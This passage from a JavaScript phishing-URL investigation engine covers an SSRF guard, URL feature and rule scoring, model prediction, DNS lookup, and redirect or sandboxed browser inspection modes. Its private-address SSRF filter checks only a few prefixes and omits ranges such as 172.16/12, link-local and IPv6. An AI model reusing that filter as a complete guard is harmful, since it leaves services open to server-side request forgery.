      // SSRF Check
      if (parsed.isIp && (parsed.hostname.startsWith('10.') || parsed.hostname.startsWith('192.168.') || parsed.hostname.startsWith('127.') || parsed.hostname === 'localhost')) {
        icase.log(`SSRF BLOCK: Private address ${parsed.hostname} prohibited`, 'warn');
        icase.schema.status = CASE_STATE.BLOCKED;
        icase.schema.lifecycleState = 'failed';
        icase.schema.completedAt = Date.now();
        icase.schema.coverage.url = STAGE_STATUS.COMPLETED;
        icase.schema.coverage.http = STAGE_STATUS.SKIPPED;
        icase.schema.assessment.verificationState = VERIFICATION_STATE.INVESTIGATION_INCOMPLETE;
        icase.schema.assessment.headline = 'SSRF Block: Private IP Network';
        icase.schema.assessment.summary = 'Target points to private loopback/internal IP address. Network probing prohibited for sandbox isolation.';
        icase.addEvidence(EVIDENCE_PROVENANCE.OBSERVED, 'meta', 'SSRF Security Block',
          `Target points to local/private network address ${parsed.hostname}. Investigation halted for sandbox safety.`,
          { hostname: parsed.hostname });
        icase.emit('complete', icase.schema);
        return icase;
      }

      // ── Step 2: URL Feature Extraction ──
      icase.setStage(CASE_STATE.URL_ANALYSIS);
      const ext = URLFeatureExtractor.extract(parsed.normalizedUrl);
      if (ext.extractionStatus === 'SUCCESS') {
        icase.schema.urlAnalysis.features = ext.features;
        icase.schema.urlAnalysis.featureVector = ext.featureVector;
        icase.schema.coverage.url = STAGE_STATUS.COMPLETED;
        icase.log(`EXTRACTED 28 FEATURES: entropy=${ext.features.hostname_entropy} | subdomains=${ext.features.num_subdomains}`);
        icase.addEvidence(EVIDENCE_PROVENANCE.OBSERVED, 'url', '28-Dimensional URL Feature Vector Extracted',
          `Computed structural features including hostname entropy (${ext.features.hostname_entropy}) and digit ratio (${ext.features.digit_ratio}).`,
          ext.features);

        if (ext.features.is_punycode === 1 || ext.features.has_homoglyphs === 1) {
          icase.schema.trustBreakpoints.push({
            type: 'HOMOGLYPH_SPOOF_DETECTED',
            expected: 'Standard Latin / ASCII Characters',
            observed: parsed.hostname,
            description: `Hostname contains Punycode/homoglyph characters (${parsed.hostname}) designed to visually mimic legitimate domains.`
          });
          icase.addEvidence(EVIDENCE_PROVENANCE.OBSERVED, 'url', 'Homoglyph / Punycode Deceptive Encoding Detected',
            `Target hostname "${parsed.hostname}" utilizes internationalized domain name (IDN) spoofing characters.`,
            { hostname: parsed.hostname, isPunycode: ext.features.is_punycode, hasHomoglyphs: ext.features.has_homoglyphs });
        }

        // ── Step 2.5: Deterministic URL Rule Engine ──
        const ruleEval = URLRuleEngine.evaluate(parsed, ext.features);
        icase.schema.ruleEngineResult = {
          ruleScore: ruleEval.ruleScore,
          classification: ruleEval.classification,
          verdict: ruleEval.verdict,
          rulesEvaluated: ruleEval.rulesEvaluated,
          rulesTriggered: ruleEval.rulesTriggered,
          categoryBreakdown: ruleEval.categoryBreakdown,
          explanation: ruleEval.explanation,
          configVersion: ruleEval.configVersion,
          timestamp: ruleEval.timestamp
        };
        icase.log(`RULE ENGINE EVALUATION: Score=${ruleEval.ruleScore}/100 [${ruleEval.classification}] (${ruleEval.rulesTriggered.length} rules triggered)`);
        icase.addEvidence(EVIDENCE_PROVENANCE.OBSERVED, 'url', `Deterministic Rule Score: ${ruleEval.ruleScore}/100 [${ruleEval.classification}]`,
          `${ruleEval.explanation} Triggered rules: ${ruleEval.rulesTriggered.map(r => `${r.ruleId} (+${r.contribution})`).join(', ') || 'None'}.`,
          ruleEval);

      } else {
        icase.schema.coverage.url = STAGE_STATUS.FAILED;
      }

      // ── Step 3: Trained URL Model Inference ──
      const pred = URLClassifier.predict(parsed.normalizedUrl);
      icase.schema.modelResult = {
        modelName: pred.modelName,
        modelVersion: pred.modelVersion,
        prediction: pred.prediction,
        probabilityPhishing: pred.probabilityPhishing,
        probabilityLegitimate: pred.probabilityLegitimate,
        confidenceLevel: pred.confidenceLevel,
        abstain: pred.abstain,
        abstainReason: pred.abstainReason,
        topContributingFeatures: pred.topContributingFeatures,
        evaluatedAt: Date.now()
      };

      if (pred.abstain) {
        icase.schema.assessment.modelState = MODEL_STATE.MODEL_UNCERTAIN;
        icase.log(`MODEL ABSTENTION: ${pred.abstainReason}`, 'warn');
        icase.addEvidence(EVIDENCE_PROVENANCE.MODEL, 'url', 'Model Prediction: UNCERTAIN (Abstention)',
          `Model probability is in borderline region (${(pred.probabilityPhishing * 100).toFixed(1)}%). Deep network/page investigation required.`,
          pred);
      } else {
        icase.schema.assessment.modelState = pred.prediction === 'PHISHING' ? MODEL_STATE.MODEL_SUSPICIOUS : MODEL_STATE.MODEL_LEGITIMATE;
        icase.log(`MODEL OUTPUT: ${pred.prediction} | P(Phishing)=${(pred.probabilityPhishing * 100).toFixed(1)}% | Confidence=${pred.confidenceLevel}`);
        icase.addEvidence(EVIDENCE_PROVENANCE.MODEL, 'url', `Trained Model Prediction: ${pred.prediction}`,
          `Model ${pred.modelName} predicted ${pred.prediction} with ${(pred.probabilityPhishing * 100).toFixed(1)}% calibrated probability.`,
          pred);
      }

      // ── Step 4: Host & DNS Intelligence ──
      icase.setStage(CASE_STATE.HOST_ANALYSIS);
      const dnsPromise = DNSReconInvestigator.resolve(parsed.hostname);
      let dnsRes = null;
      const recordHostResult = (result) => {
        icase.schema.domainAnalysis.ipAddresses = result.ipAddresses;
        icase.schema.domainAnalysis.dnsRecords = result.dnsRecords;
        icase.schema.domainAnalysis.nameservers = result.nameservers;
        icase.schema.domainAnalysis.asn = result.asn;
        icase.schema.domainAnalysis.tlsMetadata = result.tlsMetadata;
        icase.schema.domainAnalysis.source = result.source;
        icase.schema.domainAnalysis.timestamp = result.timestamp;
        if (result.status === 'SUCCESS') {
          icase.schema.coverage.host = STAGE_STATUS.COMPLETED;
          icase.log(`HOST RESOLVED: ${result.ipAddresses.join(', ')} (${result.source})`);
          icase.addEvidence(EVIDENCE_PROVENANCE.EXTERNAL, 'host', 'Host DNS & IP Resolution Observed',
            `Resolved ${result.ipAddresses.length} IP address(es) via ${result.source}: ${result.ipAddresses.join(', ')}`,
            result);
          for (const ip of result.ipAddresses) {
            icase.addGraphNode(`ip_${ip}`, ip, 'ip', { ip });
            icase.addGraphEdge('target', `ip_${ip}`, 'resolves-to', 'dns');
          }
        } else {
          icase.schema.coverage.host = STAGE_STATUS.FAILED;
          icase.log(`HOST DNS RESOLUTION FAILED: ${result.error}`, 'warn');
          icase.addEvidence(EVIDENCE_PROVENANCE.EXTERNAL, 'host', 'Host DNS Resolution Failed', result.error);
        }
      };
      // Run DNS beside Mode C so slow host enrichment does not block the render.
      if (icase.schema.inspectionMode !== 'ISOLATED_LIVE') {
        dnsRes = await dnsPromise;
        recordHostResult(dnsRes);
      }

      // ── Step 5: Real HTTP Reconnaissance ──
      icase.setStage(CASE_STATE.HTTP_ANALYSIS);
      // Match demo config by hostname OR by the ascii/punycode equivalent, OR by
      // checking if any demo key is a substring of the hostname (catches homoglyph variants).
      const demoConfig = CONTROLLED_DEMO_CASES[parsed.hostname]
        || (parsed.asciiHostname && CONTROLLED_DEMO_CASES[parsed.asciiHostname])
        || (() => {
            for (const [key, cfg] of Object.entries(CONTROLLED_DEMO_CASES)) {
              // e.g. 'paypal-security-update.top' contained inside punycode variant
              if (parsed.hostname.includes(key.split('.')[0]) || (parsed.asciiHostname && parsed.asciiHostname.includes(key.split('.')[0]))) {
                return cfg;
              }
            }
            return null;
          })();
      let httpProbe;
      let liveExtracted = null;

      if (icase.schema.inspectionMode === 'ISOLATED_LIVE') {
        icase.log('MODE C: Executing Isolated Live Inspection in sandboxed worker...');
        if (demoConfig && !isInteractiveSession(icase.schema.interactiveSession)) {
          icase.schema.isDemo = true;
          icase.log('DEMO VECTOR [MODE C]: Rendering dynamic controlled fixture via Playwright Chromium...');
          try {
            const { chromium } = await import('playwright');
            const browser = await chromium.launch({ headless: true });
            const page = await browser.newPage({ viewport: { width: 1280, height: 800 } });
            await page.setContent(demoConfig.htmlMock, { waitUntil: 'domcontentloaded' });

            const screenshotsDir = path.join(rootDir, 'data', 'screenshots');
            fs.mkdirSync(screenshotsDir, { recursive: true });
            const initialPath = path.join(screenshotsDir, `${icase.id}-initial.png`);
            try {
              await page.screenshot({ path: initialPath, type: 'png' });
              icase.schema.initialScreenshotUrl = `/api/cases/${icase.id}/screenshot?type=initial`;
            } catch {}
            icase.schema.renderStatus = await waitForRenderReadiness(page, 4000);

            const shotPath = path.join(screenshotsDir, `${icase.id}.png`);
            const shotBuf = await page.screenshot({ type: 'png' });
            fs.writeFileSync(shotPath, shotBuf);
            await browser.close();

            const extraction = PageStructureExtractor.extract(demoConfig.htmlMock, parsed.hostname);
            extraction.screenshotAvailable = true;
            extraction.screenshotUrl = `/api/cases/${icase.id}/screenshot`;
            extraction.screenshotBytes = shotBuf.length;

            liveExtracted = extraction;
            await attachScreenshotIntelligence(icase, extraction, shotPath, parsed.normalizedUrl, parsed.hostname);
            httpProbe = {
              status: 'SUCCESS',
              statusCode: 200,
              statusText: 'OK',
              initialUrl: parsed.normalizedUrl,
              finalUrl: parsed.normalizedUrl,
              redirectCount: 0,
              redirectChain: [{ url: parsed.normalizedUrl, status: 200, ms: 140, final: true }],
              latencyMs: 140,
              headers: { 'content-type': 'text/html; charset=utf-8', 'server': 'Apache/2.4' },
              contentType: 'text/html',
              bodySnippet: demoConfig.htmlMock,
              error: null
            };

            const blockedReqs = [];
            for (const f of extraction.forms) {
              if (f.method === 'POST' || f.isExternal) {
                blockedReqs.push({
                  time: new Date().toLocaleTimeString(),
                  method: f.method || 'POST',
                  url: f.action,
                  reason: `Disallowed mutating method ${f.method || 'POST'} to ${f.action} — Observation mode strictly prohibits credential or data submission.`
                });
              }
            }

            icase.schema.liveInspection = {
              status: 'SUCCESS',
              screenshotCaptured: true,
              screenshotBytes: shotBuf.length,
              pageExtraction: extraction,
              blockedRequests: blockedReqs,
              isolationReport: {
                sandboxType: 'CONTROLLED_FIXTURE_RENDER',
                playwrightAvailable: true,
                chromiumSandboxEnabled: false,
                credentialsIsolated: true,
                proxyEnforced: false,
                runtimeMode: 'SIMULATED_CONTROLLED_FIXTURE'
              }
            };

            icase.addEvidence(EVIDENCE_PROVENANCE.OBSERVED, 'http', 'Mode C Live Browser DOM & Viewport Screenshot Captured',
              `Chromium rendered page (${extraction.domNodes} nodes), captured ${shotBuf.length}-byte viewport screenshot, and extracted ${extraction.forms.length} interactive form(s).`,
              icase.schema.liveInspection);

            for (const br of blockedReqs) {
              icase.addEvidence(EVIDENCE_PROVENANCE.OBSERVED, 'network', 'Observation Mode: Mutating Submission Blocked',
                `${br.method} request to ${br.url} blocked to prevent data transmission.`, br);
            }

          } catch (pwErr) {
            icase.log(`Demo Playwright rendering notice: ${pwErr.message}`, 'warn');
            const extraction = PageStructureExtractor.extract(demoConfig.htmlMock, parsed.hostname);
            liveExtracted = extraction;
            httpProbe = {
              status: 'SUCCESS',
              statusCode: 200,
              statusText: 'OK',
              initialUrl: parsed.normalizedUrl,
              finalUrl: parsed.normalizedUrl,
              redirectCount: 0,
              redirectChain: [{ url: parsed.normalizedUrl, status: 200, ms: 140, final: true }],
              latencyMs: 140,
              headers: { 'content-type': 'text/html; charset=utf-8', 'server': 'Apache/2.4' },
              contentType: 'text/html',
              bodySnippet: demoConfig.htmlMock,
              error: null
            };
          }
        } else {
          // Real live target: LiveInspector via container supervisor
          const liveRes = await LiveInspector.inspect(parsed.normalizedUrl, {
            caseId: icase.id,
            interactive: isInteractiveSession(icase.schema.interactiveSession),
            keepAliveMs: isInteractiveSession(icase.schema.interactiveSession) ? DEFAULT_INTERACTIVE_SESSION_MS : undefined,
            onInteractiveEvent: (observation) => icase._publishInteractiveObservation?.(observation),
            onInteractiveEnd: (status, detail = {}) => {
              if (icase.schema.interactiveSession) {
                // Idempotency records are bounded by the per-session action
                // ceiling and discarded when this worker session terminates.
                icase._interactiveActionRequests?.clear();
                icase.schema.interactiveSession.status = status;
                icase.schema.interactiveSession.endedAt = Date.now();
                const reason = ['SESSION_LIMIT_REACHED', 'INPUT_CLOSED', 'SUPERVISOR_TIMEOUT', 'SUPERVISOR_START_FAILED', 'OPERATOR_CANCELLED', 'CLEANUP_FAILED', 'WORKER_EXITED'].includes(detail.reason)
                  ? detail.reason : 'WORKER_EXITED';
                icase.schema.interactiveSession.endedReason = reason;
                if (detail.lifecycle && typeof detail.lifecycle === 'object') {
                  const evidence = detail.lifecycle;
                  icase.schema.interactiveSession.workerLifecycle = {
                    readyEventReceived: evidence.readyEventReceived === true,
                    workerReadyEventAt: Number.isFinite(evidence.workerReadyEventAt) ? evidence.workerReadyEventAt : null,
                    readinessEventReceivedAt: Number.isFinite(evidence.readinessEventReceivedAt) ? evidence.readinessEventReceivedAt : null,
                    sessionStartedAt: Number.isFinite(evidence.sessionStartedAt) ? evidence.sessionStartedAt : null,
                    workerSessionStartedAt: Number.isFinite(evidence.workerSessionStartedAt) ? evidence.workerSessionStartedAt : null,
                    workerEndEventAt: Number.isFinite(evidence.workerEndEventAt) ? evidence.workerEndEventAt : null,
                    endedAt: Number.isFinite(evidence.endedAt) ? evidence.endedAt : null,
                    endReason: reason,
                    workerExitCode: Number.isInteger(evidence.workerExitCode) ? evidence.workerExitCode : null,
                    workerSignalCode: typeof evidence.workerSignalCode === 'string' && /^[A-Z0-9]+$/.test(evidence.workerSignalCode)
                      ? evidence.workerSignalCode : null,
                    readyElapsedMs: Number.isFinite(evidence.readyElapsedMs) ? evidence.readyElapsedMs : null,
                    sessionElapsedMs: Number.isFinite(evidence.sessionElapsedMs) ? evidence.sessionElapsedMs : null,
                    deadlineElapsedMs: Number.isFinite(evidence.deadlineElapsedMs) ? evidence.deadlineElapsedMs : null
                  };
                }
                if (icase.schema.liveInspection) {
                  icase.schema.liveInspection.runtimeSessionActive = false;
                  icase.schema.liveInspection.runtimeSessionEndedAt = icase.schema.interactiveSession.endedAt;
                }
                icase._publishInteractiveObservation?.({ type: 'session_ended', observation: `Interactive browser session ended (${reason}).` });
                icase.emit('stage', { stage: 'INTERACTIVE_SESSION_ENDED', sessionStatus: status,
                  schema: structuredClone(icase.schema) });
              }
            },
            captureDelayMs: icase.schema.captureDelayMs,
            onCaptureStatus: (captureStatus) => {
              icase.schema.screenshotCapture = captureStatus;
              icase.emit('stage', { stage: 'SCREENSHOT_CAPTURE_STATUS', captureStatus });
            },
            onTimings: (timings) => { icase.schema.modeCTimings = timings; },
            onInitialScreenshot: ({ artifactUrl, screenshotBytes, sha256, renderStatus, capturedAt }) => {
              icase.schema.initialScreenshotUrl = artifactUrl;
              icase.schema.pageAnalysis.screenshotAvailable = true;
              icase.schema.pageAnalysis.status = STAGE_STATUS.RUNNING;
              icase.schema.pageAnalysis.renderStatus = renderStatus || 'RENDER_PARTIAL';
              icase.schema.renderStatus = renderStatus || 'RENDER_PARTIAL';
              const initialEvidence = icase.addEvidence(
                EVIDENCE_PROVENANCE.OBSERVED,
                'screenshot',
                'Mode C Initial Viewport Screenshot Captured',
                `Captured a ${screenshotBytes}-byte viewport from ${parsed.normalizedUrl} after the configured post-render countdown. Render status: ${renderStatus || 'RENDER_PARTIAL'}.`,
                { artifactUrl, sha256, screenshotBytes, checkpoint: 'INITIAL', renderStatus: renderStatus || 'RENDER_PARTIAL', capturedAt }
              );
              icase.schema.initialScreenshotEvidenceId = initialEvidence.id;
              icase.log('INITIAL SCREENSHOT READY: displaying partial viewport while final render continues.');
              icase.emit('stage', { stage: 'INITIAL_SCREENSHOT_CAPTURED' });
            }
          }, icase._abortSignal);
          icase.schema.liveInspection = liveRes;
          let interactiveStartAcknowledged = true;
          if (icase.schema.interactiveSession?.status === 'STARTING' && liveRes.runtimeSessionActive === true) {
            const sessionDeadline = await LiveInspector.startInteractiveSession(icase.id);
            interactiveStartAcknowledged = Number.isFinite(sessionDeadline);
            if (interactiveStartAcknowledged) liveRes.runtimeSessionUntil = sessionDeadline;
          }
          publishInteractiveStartState(icase, liveRes, interactiveStartAcknowledged);
          const liveHttpCode = Number(liveRes.httpStatus) || null;
          const hasLiveHttpResponse = liveHttpCode !== null;
          const isLiveAccessDenied = liveHttpCode === 403;
          icase.schema.accessStatus = isLiveAccessDenied ? 'BLOCKED_HTTP_403'
            : (hasLiveHttpResponse && liveHttpCode >= 400 ? 'HTTP_ERROR'
              : (hasLiveHttpResponse ? 'ACCESSIBLE' : 'NO_RESPONSE'));
          icase.schema.inspectionStatus = isLiveAccessDenied ? 'CONTENT_UNAVAILABLE'
            : (hasLiveHttpResponse && liveHttpCode >= 400 ? 'HTTP_ERROR_DOCUMENT'
              : (liveRes.pageExtraction ? 'CONTENT_INSPECTED' : 'NOT_RUN'));
          icase.schema.screenshotStatus = liveRes.screenshotCaptured ? 'CAPTURED' : 'NOT_CAPTURED';
          liveRes.accessStatus = icase.schema.accessStatus;
          liveRes.inspectionStatus = icase.schema.inspectionStatus;
          liveRes.screenshotStatus = icase.schema.screenshotStatus;
          icase.schema.modeCTimings = { ...(liveRes.modeCTimings || {}), ...(icase.schema.modeCTimings || {}),
            total_investigation_ms: Date.now() - icase.schema.createdAt };
          icase.log(`MODE C TIMINGS (ms): ${JSON.stringify(icase.schema.modeCTimings)}`);
          if (liveRes.screenshotCaptured) {
            // Keep the worker's capture-clock timestamps. Replacing capturedAt
            // here hides timing errors and can make the UI countdown disagree
            // with the actual screenshot checkpoint.
            icase.schema.screenshotCapture = { ...(icase.schema.screenshotCapture || {}),
              ...(liveRes.screenshotCapture || {}), status: 'READY',
              capturedAt: liveRes.screenshotCapture?.capturedAt || icase.schema.screenshotCapture?.capturedAt || Date.now() };
          }

          if (liveRes.status === 'BLOCKED') {
            httpProbe = {
              status: 'BLOCKED',
              statusCode: null,
              statusText: 'BLOCKED_BY_EGRESS_POLICY',
              initialUrl: parsed.normalizedUrl,
              finalUrl: parsed.normalizedUrl,
              redirectCount: 0,
              redirectChain: [],
              latencyMs: liveRes.timingMs,
              headers: {},
              contentType: '',
              bodySnippet: null,
              error: liveRes.errors[0] || 'SSRF / Egress Policy Blocked'
            };
            icase.addEvidence(EVIDENCE_PROVENANCE.OBSERVED, 'http', 'Live Inspection Blocked by Policy', httpProbe.error, liveRes);
          } else if (['SUCCESS', 'PARTIAL'].includes(liveRes.status) && liveRes.pageExtraction) {
            liveExtracted = liveRes.pageExtraction;
            icase.schema.renderStatus = liveRes.renderStatus || 'RENDER_PARTIAL';
            if (liveRes.pageExtraction.screenshotAvailable) {
              const screenshotPath = path.join(rootDir, 'data', 'screenshots', `${icase.id}.png`);
              try {
                const screenshotResult = await attachScreenshotIntelligence(
                  icase, liveRes.pageExtraction, screenshotPath, parsed.normalizedUrl, parsed.hostname
                );
                icase.schema.screenshotArtifactUrl = `/api/cases/${icase.id}/screenshot`;
                if (liveRes.pageExtraction.initialScreenshotAvailable) {
                  icase.schema.initialScreenshotUrl = `/api/cases/${icase.id}/screenshot?type=initial`;
                }
                const screenshotEvidence = icase.addEvidence(
                  EVIDENCE_PROVENANCE.OBSERVED,
                  'screenshot',
                  'Mode C Viewport Screenshot Captured',
                  `Captured a ${liveRes.pageExtraction.screenshotBytes || fs.statSync(screenshotPath).size}-byte browser viewport from ${liveRes.finalUrl || parsed.normalizedUrl}; render status: ${liveRes.renderStatus || 'RENDER_PARTIAL'}.`,
                  {
                    artifactUrl: icase.schema.screenshotArtifactUrl,
                    initialArtifactUrl: icase.schema.initialScreenshotUrl,
                    sha256: createHash('sha256').update(fs.readFileSync(screenshotPath)).digest('hex'),
                    renderStatus: liveRes.renderStatus || 'RENDER_PARTIAL',
                    finalUrl: liveRes.finalUrl || parsed.normalizedUrl,
                    screenshotMetadata: liveRes.pageExtraction.screenshotMetadata || null,
                    readinessDiagnostics: liveRes.readinessDiagnostics || null
                  }
                );
                liveRes.pageExtraction.screenshotEvidenceId = screenshotEvidence.id;
                icase.schema.screenshotArtifactEvidenceId = screenshotEvidence.id;
                if (screenshotResult.status !== 'SUCCESS') {
                  icase.log('Screenshot intelligence unavailable: ' + screenshotResult.error, 'warn');
                }
              } catch (screenshotError) {
                icase.log('Screenshot intelligence error: ' + screenshotError.message, 'warn');
              }
            }
            const httpCode = liveRes.httpStatus || null;
            const isAccessRestricted = httpCode === 403;
            const proxyPolicyResponse = Boolean(liveRes.httpHeaders?.['x-trustlayer-egress-policy']);
            httpProbe = {
              // A 403 is still an observed HTTP response, so preserve its page
              // body/screenshot while labeling the restriction explicitly.
              status: httpCode ? 'SUCCESS' : liveRes.status,
              statusCode: httpCode,
              statusText: isAccessRestricted ? 'HTTP_403_ACCESS_RESTRICTION' : (httpCode ? `HTTP_${httpCode}` : liveRes.status),
              initialUrl: parsed.normalizedUrl,
              finalUrl: liveRes.finalUrl || parsed.normalizedUrl,
              redirectCount: liveRes.redirectChain.length,
              redirectChain: liveRes.redirectChain,
              latencyMs: liveRes.timingMs,
              headers: liveRes.httpHeaders || {},
              requestHeaders: liveRes.requestHeaders || {},
              contentType: liveRes.contentType || 'text/html',
              bodySnippet: liveRes.responseBodyExcerpt || (liveRes.pageExtraction?.title ? ('<html><title>' + liveRes.pageExtraction.title + '</title></html>') : ''),
              error: isAccessRestricted ? 'The HTTP endpoint returned 403 Forbidden; this is an access restriction and is not by itself evidence of phishing.' : null,
              correlationId: liveRes.correlationId,
              responseOrigin: proxyPolicyResponse ? 'EGRESS_PROXY_POLICY' : (httpCode ? 'TARGET_TLS_ENDPOINT' : 'UNKNOWN'),
              responseDiagnostics: liveRes.responseDiagnostics || null,
              accessRestriction: isAccessRestricted ? {
                status: httpCode,
                origin: proxyPolicyResponse ? 'EGRESS_PROXY_POLICY' : 'TARGET_TLS_ENDPOINT',
                finalUrl: liveRes.finalUrl || parsed.normalizedUrl,
                headers: liveRes.httpHeaders || {},
                bodyExcerpt: liveRes.responseBodyExcerpt || '',
                diagnostics: liveRes.responseDiagnostics || null
              } : null,
              egressObservations: liveRes.egressObservations || null
            };
          } else {
            const failure = (liveRes.errors || []).join('; ') || 'Isolated worker failed or the required container runtime is unavailable.';
            icase.schema.renderStatus = 'RENDER_FAILED';
            icase.log('Mode C refused: ' + failure, 'warn');
            httpProbe = {
              status: 'FAILED', statusCode: null, statusText: 'ISOLATED_WORKER_UNAVAILABLE',
              initialUrl: parsed.normalizedUrl, finalUrl: parsed.normalizedUrl,
              redirectCount: 0, redirectChain: [], latencyMs: liveRes.timingMs || 0,
              headers: {}, contentType: '', bodySnippet: null, error: failure
            };
            icase.addEvidence(EVIDENCE_PROVENANCE.OBSERVED, 'http', 'Isolated Live Inspection Refused',
              'Mode C did not execute because the required isolated container inspection was unavailable: ' + failure, liveRes);
          }
        }
      } else if (icase.schema.inspectionMode === 'MODE_B') {
        icase.log('MODE B: tracing HTTP redirects and headers without browser rendering.');
        const redirectResult = await RedirectTracer.trace(parsed.normalizedUrl, { timeoutMs: 5000, maxHops: 10 });
        icase.schema.redirectAssessment = redirectResult;
        const lastHop = redirectResult.redirectChain.at(-1) || {};
        httpProbe = {
          status: redirectResult.status === 'SUCCESS' ? 'SUCCESS' : redirectResult.status,
          statusCode: lastHop.status || null,
          statusText: redirectResult.status,
          initialUrl: redirectResult.initialUrl,
          finalUrl: redirectResult.finalUrl,
          redirectCount: redirectResult.hopsCount,
          redirectChain: redirectResult.redirectChain,
          latencyMs: redirectResult.redirectChain.reduce((total, hop) => total + (hop.latencyMs || 0), 0),
          headers: redirectResult.headers,
          contentType: redirectResult.headers['content-type'] || '',
          bodySnippet: null,
          error: redirectResult.error
        };
        icase.addEvidence(EVIDENCE_PROVENANCE.OBSERVED, 'http', 'Mode B HTTP Redirect Trace',
          `${redirectResult.summary} Risk level: ${redirectResult.riskLevel}.`, redirectResult);
        const traceEvidence = icase.schema.evidence.at(-1);
        redirectResult.evidenceId = traceEvidence?.id || null;
      } else if (demoConfig) {
        // Mode A on demoConfig: URL-only heuristics, zero live browser execution, zero screenshot
        icase.schema.isDemo = true;
        icase.log('DEMO VECTOR [MODE A]: Using URL lexical heuristics (zero live network connection)');
        httpProbe = {
          status: 'SUCCESS',
          statusCode: 200,
          statusText: 'OK',
          initialUrl: parsed.normalizedUrl,
          finalUrl: parsed.normalizedUrl,
          redirectCount: 0,
          redirectChain: [{ url: parsed.normalizedUrl, status: 200, ms: 140, final: true }],
          latencyMs: 140,
          headers: { 'content-type': 'text/html; charset=utf-8', 'server': 'Apache/2.4' },
          contentType: 'text/html',
          bodySnippet: demoConfig.htmlMock,
          error: null
        };
        icase.addEvidence(EVIDENCE_PROVENANCE.SIMULATED, 'http', 'HTTP 200 Response [CONTROLLED DEMO]',
          `Simulated sandbox response for test vector ${parsed.hostname}`,
          httpProbe);
      } else {
        // Mode A is intentionally URL-only. Target contact requires the separate,
        // consented Mode B trace or isolated Mode C inspection.
        httpProbe = {
          status: 'NOT_RUN',
          statusCode: null,
          statusText: 'NOT_REQUESTED',
          initialUrl: parsed.normalizedUrl,
          finalUrl: parsed.normalizedUrl,
          redirectCount: 0,
          redirectChain: [],
          latencyMs: 0,
          headers: {},
          contentType: '',
          bodySnippet: null,
          error: 'Mode A is URL-only. No HTTP request was made to the target.'
        };
      }

      if (Number(httpProbe.statusCode) === 403) {
        icase.schema.accessStatus = 'BLOCKED_HTTP_403';
        if (icase.schema.inspectionMode !== INSPECTION_MODE.ISOLATED_LIVE) icase.schema.inspectionStatus = 'CONTENT_UNAVAILABLE';
      } else if (Number(httpProbe.statusCode) >= 400 && icase.schema.inspectionMode !== INSPECTION_MODE.ISOLATED_LIVE) {
        icase.schema.accessStatus = 'HTTP_ERROR';
        icase.schema.inspectionStatus = 'HTTP_ERROR_DOCUMENT';
      }

      icase.schema.httpAnalysis = {
        status: httpProbe.status === 'SUCCESS' ? STAGE_STATUS.COMPLETED
          : (httpProbe.status === 'NOT_RUN' ? STAGE_STATUS.NOT_RUN : STAGE_STATUS.FAILED),
        statusCode: httpProbe.statusCode,
        statusText: httpProbe.statusText,
        initialUrl: httpProbe.initialUrl,
        finalUrl: httpProbe.finalUrl,
        redirectCount: httpProbe.redirectCount,
        redirectChain: httpProbe.redirectChain,
        latencyMs: httpProbe.latencyMs,
        headers: httpProbe.headers,
        requestHeaders: httpProbe.requestHeaders || {},
        correlationId: httpProbe.correlationId || null,
        responseOrigin: httpProbe.responseOrigin || null,
        responseDiagnostics: httpProbe.responseDiagnostics || null,
        responseBodyExcerpt: httpProbe.bodySnippet || '',
        accessRestriction: httpProbe.accessRestriction || null,
        egressObservations: httpProbe.egressObservations || null,
        contentType: httpProbe.contentType,
        responseSize: httpProbe.bodySnippet ? httpProbe.bodySnippet.length : 0,
        serverHeader: httpProbe.headers['server'] || null,
        error: httpProbe.error,
        timestamp: Date.now()
      };

      if (!dnsRes) {
        dnsRes = await dnsPromise;
        recordHostResult(dnsRes);
      }

      let formsFound = [];
      let scriptsFound = [];

      if (httpProbe.status === 'SUCCESS') {
        icase.schema.coverage.http = STAGE_STATUS.COMPLETED;
        icase.log(`HTTP ${httpProbe.statusCode} ${httpProbe.statusText} (${httpProbe.latencyMs}ms)`);
        
        // Record network event
        icase.schema.networkAnalysis.requests.push({
          time: new Date().toLocaleTimeString(),
          method: 'GET',
          host: parsed.hostname,
          path: parsed.pathname,
          status: httpProbe.statusCode,
          type: httpProbe.contentType || 'document',
          size: httpProbe.bodySnippet ? `${httpProbe.bodySnippet.length} B` : '0 B',
          duration: `${httpProbe.latencyMs}ms`
        });

        if (httpProbe.redirectCount > 0) {
          icase.log(`REDIRECT TRACED: ${httpProbe.initialUrl} → ${httpProbe.finalUrl}`);
          icase.addGraphNode('final_url', httpProbe.finalUrl, 'redirect', { url: httpProbe.finalUrl });
          icase.addGraphEdge('target', 'final_url', `HTTP ${httpProbe.statusCode}`, 'redirect');
          icase.addEvidence(EVIDENCE_PROVENANCE.OBSERVED, 'http', `HTTP Redirect Observed`,
            `Navigation redirected to ${httpProbe.finalUrl} (HTTP ${httpProbe.statusCode})`,
            httpProbe);
        } else {
          icase.addEvidence(EVIDENCE_PROVENANCE.OBSERVED, 'http', `HTTP ${httpProbe.statusCode} Response Observed`,
            `Server returned HTTP ${httpProbe.statusCode} in ${httpProbe.latencyMs}ms. Content-Type: ${httpProbe.contentType}`,
            httpProbe);
        }

        // ── Step 6: Page Structure & DOM Excavation + Page Intent Intelligence ──
        icase.setStage(CASE_STATE.PAGE_ANALYSIS);
        const pageExt = liveExtracted || PageStructureExtractor.extract(httpProbe.bodySnippet, parsed.hostname);
        const isAccessErrorDocument = Number(httpProbe.statusCode) >= 400;
        formsFound = isAccessErrorDocument ? [] : pageExt.forms;
        scriptsFound = isAccessErrorDocument ? [] : pageExt.scripts;

        const intentAnalysis = PageIntentEngine.analyze(pageExt, parsed, icase.schema.identityAnalysis);

        icase.schema.pageAnalysis = {
          status: isAccessErrorDocument ? 'CONTENT_UNAVAILABLE' : STAGE_STATUS.COMPLETED,
          title: pageExt.title,
          headings: pageExt.headings || [],
          metaDescription: pageExt.metaDescription || null,
          buttons: pageExt.buttons || [],
          domNodes: pageExt.domNodes,
          htmlBytes: pageExt.htmlBytes,
          intent: {
            primary: isAccessErrorDocument ? 'NOT_ASSESSED' : intentAnalysis.primary,
            secondary: isAccessErrorDocument ? null : intentAnalysis.secondary,
            confidence: isAccessErrorDocument ? 0 : intentAnalysis.confidence,
            modelResult: intentAnalysis.modelResult,
            ruleBaseline: intentAnalysis.ruleBaseline,
            intentConsistency: intentAnalysis.intentConsistency,
            claimedPurpose: intentAnalysis.claimedPurpose,
            observedPurpose: intentAnalysis.observedPurpose,
            purposeConsistency: intentAnalysis.purposeConsistency,
            purposeMismatch: isAccessErrorDocument ? false : intentAnalysis.purposeMismatch,
            mismatchReason: isAccessErrorDocument ? null : intentAnalysis.mismatchReason,
